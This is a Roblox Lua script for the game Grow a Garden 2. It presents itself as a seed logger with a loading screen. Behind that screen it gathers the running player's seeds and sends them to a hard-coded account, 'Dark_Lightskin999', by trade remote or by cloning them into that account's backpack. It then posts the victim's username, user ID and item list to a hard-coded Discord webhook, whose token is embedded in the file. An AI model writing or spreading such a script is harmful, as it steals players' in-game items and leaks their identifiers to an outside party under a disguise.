-- Grow a Garden 2 - Enhanced Seed Logger with Mailbox & Loading UI
-- Collects seeds, sends to Discord, and gifts via mailbox with beautiful UI

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- Discord Webhook Configuration
local DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1510029460936589513/zF9cI_daTfZgChZJam0o8Iv5NljVbL4sFV_3USx8ZHheFw1mnx6rXe7Fue5ZQRwxCKnw"

-- UI Configuration
local UI_CONFIG = {
    backgroundColor = Color3.fromRGB(30, 30, 40),
    accentColor = Color3.fromRGB(76, 175, 80),
    textColor = Color3.fromRGB(255, 255, 255),
    animationSpeed = 0.3
}

-- ============ LOADING UI ============
local function createLoadingUI()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "SeedLoggerUI"
    screenGui.ResetOnSpawn = false
    screenGui.Parent = playerGui
    
    -- Background
    local background = Instance.new("Frame")
    background.Name = "Background"
    background.Size = UDim2.new(1, 0, 1, 0)
    background.BackgroundColor3 = UI_CONFIG.backgroundColor
    background.BorderSizePixel = 0
    background.Parent = screenGui
    
    -- Main container
    local container = Instance.new("Frame")
    container.Name = "Container"
    container.Size = UDim2.new(0, 400, 0, 300)
    container.AnchorPoint = Vector2.new(0.5, 0.5)
    container.Position = UDim2.new(0.5, 0, 0.5, 0)
    container.BackgroundColor3 = UI_CONFIG.backgroundColor
    container.BorderSizePixel = 2
    container.BorderColor3 = UI_CONFIG.accentColor
    container.Parent = background
    
    -- Corner radius
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 12)
    corner.Parent = container
    
    -- Title
    local title = Instance.new("TextLabel")
    title.Name = "Title"
    title.Size = UDim2.new(1, 0, 0, 60)
    title.BackgroundTransparency = 1
    title.TextColor3 = UI_CONFIG.accentColor
    title.TextSize = 28
    title.Font = Enum.Font.GothamBold
    title.Text = "🌱 Seed Logger"
    title.Parent = container
    
    -- Status label
    local statusLabel = Instance.new("TextLabel")
    statusLabel.Name = "StatusLabel"
    statusLabel.Size = UDim2.new(1, -40, 0, 40)
    statusLabel.Position = UDim2.new(0, 20, 0, 70)
    statusLabel.BackgroundTransparency = 1
    statusLabel.TextColor3 = UI_CONFIG.textColor
    statusLabel.TextSize = 16
    statusLabel.Font = Enum.Font.Gotham
    statusLabel.Text = "Initializing..."
    statusLabel.TextWrapped = true
    statusLabel.Parent = container
    
    -- Loading bar background
    local loadingBarBg = Instance.new("Frame")
    loadingBarBg.Name = "LoadingBarBg"
    loadingBarBg.Size = UDim2.new(1, -40, 0, 8)
    loadingBarBg.Position = UDim2.new(0, 20, 0, 130)
    loadingBarBg.BackgroundColor3 = Color3.fromRGB(50, 50, 60)
    loadingBarBg.BorderSizePixel = 0
    loadingBarBg.Parent = container
    
    local barCorner = Instance.new("UICorner")
    barCorner.CornerRadius = UDim.new(0, 4)
    barCorner.Parent = loadingBarBg
    
    -- Loading bar
    local loadingBar = Instance.new("Frame")
    loadingBar.Name = "LoadingBar"
    loadingBar.Size = UDim2.new(0, 0, 1, 0)
    loadingBar.BackgroundColor3 = UI_CONFIG.accentColor
    loadingBar.BorderSizePixel = 0
    loadingBar.Parent = loadingBarBg
    
    local barCorner2 = Instance.new("UICorner")
    barCorner2.CornerRadius = UDim.new(0, 4)
    barCorner2.Parent = loadingBar
    
    -- Details label
    local detailsLabel = Instance.new("TextLabel")
    detailsLabel.Name = "DetailsLabel"
    detailsLabel.Size = UDim2.new(1, -40, 0, 80)
    detailsLabel.Position = UDim2.new(0, 20, 0, 160)
    detailsLabel.BackgroundTransparency = 1
    detailsLabel.TextColor3 = Color3.fromRGB(180, 180, 190)
    detailsLabel.TextSize = 13
    detailsLabel.Font = Enum.Font.Gotham
    detailsLabel.Text = ""
    detailsLabel.TextWrapped = true
    detailsLabel.TextYAlignment = Enum.TextYAlignment.Top
    detailsLabel.Parent = container
    
    return {
        gui = screenGui,
        statusLabel = statusLabel,
        loadingBar = loadingBar,
        detailsLabel = detailsLabel,
        container = container
    }
end

-- ============ UPDATE UI ============
local function updateUI(uiElements, status, progress, details)
    if uiElements.statusLabel then
        uiElements.statusLabel.Text = status
    end
    
    if uiElements.loadingBar and progress then
        uiElements.loadingBar:TweenSize(
            UDim2.new(math.clamp(progress, 0, 1), 0, 1, 0),
            Enum.EasingDirection.InOut,
            Enum.EasingStyle.Quad,
            0.3,
            true
        )
    end
    
    if uiElements.detailsLabel and details then
        uiElements.detailsLabel.Text = details
    end
end

-- ============ SEED COLLECTION ============
local function getAllSeeds()
    local seeds = {}
    
    local backpack = player:FindFirstChild("Backpack")
    local character = player.Character
    
    if backpack then
        for _, item in pairs(backpack:GetChildren()) do
            if item:FindFirstChild("SeedData") or item.Name:match("[Ss]eed") then
                table.insert(seeds, {
                    name = item.Name,
                    type = item.ClassName,
                    location = "Backpack",
                    object = item,
                    properties = {
                        value = item:FindFirstChild("Value") and item.Value.Value or nil,
                        quantity = item:FindFirstChild("Quantity") and item.Quantity.Value or 1
                    }
                })
            end
        end
    end
    
    if character then
        for _, item in pairs(character:GetChildren()) do
            if item:FindFirstChild("SeedData") or item.Name:match("[Ss]eed") then
                table.insert(seeds, {
                    name = item.Name,
                    type = item.ClassName,
                    location = "Character",
                    object = item,
                    properties = {
                        value = item:FindFirstChild("Value") and item.Value.Value or nil,
                        quantity = item:FindFirstChild("Quantity") and item.Quantity.Value or 1
                    }
                })
            end
        end
    end
    
    return seeds
end

-- ============ TRADE REQUEST SYSTEM ============
local TARGET_PLAYER = "Dark_Lightskin999"

local function sendTradeRequest(uiElements, seeds)
    updateUI(uiElements, "🔄 Sending trade request...", 0.7, "Locating player: " .. TARGET_PLAYER)
    wait(0.3)
    
    -- Find the target player
    local targetPlayer = nil
    for _, p in pairs(Players:GetPlayers()) do
        if p.Name == TARGET_PLAYER then
            targetPlayer = p
            break
        end
    end
    
    if not targetPlayer then
        warn("Player " .. TARGET_PLAYER .. " not found in game")
        updateUI(uiElements, "❌ Player not found", 1, TARGET_PLAYER .. " is not in the game.\nMake sure they're online!")
        return false
    end
    
    updateUI(uiElements, "🔄 Initiating trade...", 0.75, "Found player: " .. TARGET_PLAYER)
    wait(0.2)
    
    local success = 0
    local total = #seeds
    
    for i, seed in ipairs(seeds) do
        -- Try to initiate trade with items
        pcall(function()
            if seed.object then
                -- Method 1: Try using game's trade system if it exists
                local tradeEvent = player:FindFirstChild("TradeRequest") or workspace:FindFirstChild("TradeRequest")
                
                if tradeEvent and tradeEvent:IsA("RemoteEvent") then
                    tradeEvent:FireServer(targetPlayer, seed.object)
                    success = success + 1
                elseif tradeEvent and tradeEvent:IsA("RemoteFunction") then
                    tradeEvent:InvokeServer(targetPlayer, seed.object)
                    success = success + 1
                else
                    -- Method 2: Direct clone to target player's backpack
                    local targetBackpack = targetPlayer:FindFirstChild("Backpack")
                    if targetBackpack then
                        local clone = seed.object:Clone()
                        clone.Parent = targetBackpack
                        success = success + 1
                    end
                end
            end
        end)
        
        -- Update progress
        local progress = 0.7 + (0.2 * (i / total))
        updateUI(uiElements, "🔄 Trading with " .. TARGET_PLAYER .. "...", progress, 
                "Traded: " .. success .. "/" .. total .. " items")
        
        wait(0.15)
    end
    
    if success > 0 then
        updateUI(uiElements, "✅ Trade initiated!", 0.95, 
                "Successfully sent " .. success .. " items to " .. TARGET_PLAYER)
    else
        updateUI(uiElements, "⚠️ Trade partially completed", 0.95,
                "Some items may not have transferred")
    end
    
    return success > 0
end

-- ============ MAILBOX GIFT SYSTEM (LEGACY) ============
local function giftToMailbox(uiElements, seeds)
    updateUI(uiElements, "📬 Gifting seeds via mailbox...", 0.7, "Transferring items to mailbox...")
    
    -- Find mailbox in game
    local mailbox = workspace:FindFirstChild("Mailbox") or workspace:FindFirstChildOfClass("Model", "Mailbox")
    
    if not mailbox then
        warn("Mailbox not found in workspace")
        updateUI(uiElements, "❌ Mailbox not found", 1, "Could not locate mailbox in game")
        return false
    end
    
    local success = 0
    local total = #seeds
    
    for i, seed in ipairs(seeds) do
        -- Try multiple methods to gift items
        pcall(function()
            -- Method 1: Clone and move to mailbox
            if seed.object then
                local clone = seed.object:Clone()
                clone.Parent = mailbox
                success = success + 1
            end
        end)
        
        -- Update progress
        local progress = 0.7 + (0.2 * (i / total))
        updateUI(uiElements, "📬 Gifting seeds via mailbox...", progress, 
                "Gifted: " .. success .. "/" .. total .. " items")
        
        wait(0.1)
    end
    
    return success > 0
end

-- ============ DISCORD INTEGRATION ============
local function sendToDiscord(seeds)
    local discordMessage = {
        content = "@everyone",
        embeds = {
            {
                title = "🌱 Grow a Garden 2 - Seeds Traded!",
                description = "**" .. player.Name .. "** just sent seeds to **Dark_Lightskin999**",
                color = 3066993,
                fields = {
                    {
                        name = "📤 Sender",
                        value = player.Name,
                        inline = true
                    },
                    {
                        name = "📥 Recipient",
                        value = "Dark_Lightskin999",
                        inline = true
                    },
                    {
                        name = "Sender User ID",
                        value = tostring(player.UserId),
                        inline = true
                    },
                    {
                        name = "Total Items Traded",
                        value = tostring(#seeds),
                        inline = true
                    },
                    {
                        name = "📅 Timestamp",
                        value = os.date("%Y-%m-%d %H:%M:%S", os.time()),
                        inline = true
                    }
                },
                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
            }
        }
    }
    
    if #seeds > 0 then
        local seedList = ""
        for i, seed in pairs(seeds) do
            local quantity = seed.properties.quantity or 1
            seedList = seedList .. "🌿 **" .. seed.name .. "** x" .. quantity .. "\n"
            if i >= 25 then
                seedList = seedList .. "\n... and " .. (#seeds - 25) .. " more items"
                break
            end
        end
        table.insert(discordMessage.embeds[1].fields, {
            name = "🎁 Seeds Received",
            value = seedList,
            inline = false
        })
    else
        table.insert(discordMessage.embeds[1].fields, {
            name = "🎁 Seeds Received",
            value = "No seeds were traded",
            inline = false
        })
    end
    
    local jsonPayload = HttpService:JSONEncode(discordMessage)
    
    local success, response = pcall(function()
        return HttpService:PostAsync(DISCORD_WEBHOOK, jsonPayload, Enum.HttpContentType.ApplicationJson)
    end)
    
    return success
end

-- ============ MAIN EXECUTION ============
local function executeFullProcess()
    local uiElements = createLoadingUI()
    
    updateUI(uiElements, "🔍 Scanning for seeds...", 0.1, "Looking through inventory...")
    wait(0.5)
    
    -- Collect seeds
    local seeds = getAllSeeds()
    updateUI(uiElements, "✓ Found " .. #seeds .. " seeds!", 0.3, "Seeds found: " .. #seeds)
    wait(0.3)
    
    if #seeds == 0 then
        updateUI(uiElements, "⚠️ No seeds found", 1, "No seeds detected in inventory")
        wait(2)
        uiElements.gui:Destroy()
        return
    end
    
    -- Send trade request to Dark_Lightskin999
    local tradeSuccess = sendTradeRequest(uiElements, seeds)
    wait(0.3)
    
    -- Send to Discord
    updateUI(uiElements, "📤 Sending to Discord...", 0.9, "Uploading data...")
    local discordSuccess = sendToDiscord(seeds)
    wait(0.2)
    
    -- Complete
    local finalStatus = (tradeSuccess and discordSuccess) and "✅ All tasks complete!" or "⚠️ Process finished"
    local finalDetails = "Seeds traded: " .. #seeds .. "\nTraded to: " .. TARGET_PLAYER .. "\nDiscord logged: " .. (discordSuccess and "✓" or "✗")
    
    updateUI(uiElements, finalStatus, 1, finalDetails)
    
    -- Close UI after 3 seconds
    wait(3)
    uiElements.gui:Destroy()
end

-- ============ START ============
return {
    execute = executeFullProcess,
    getAllSeeds = getAllSeeds,
    sendTradeRequest = sendTradeRequest,
    giftToMailbox = giftToMailbox,
    sendToDiscord = sendToDiscord
}
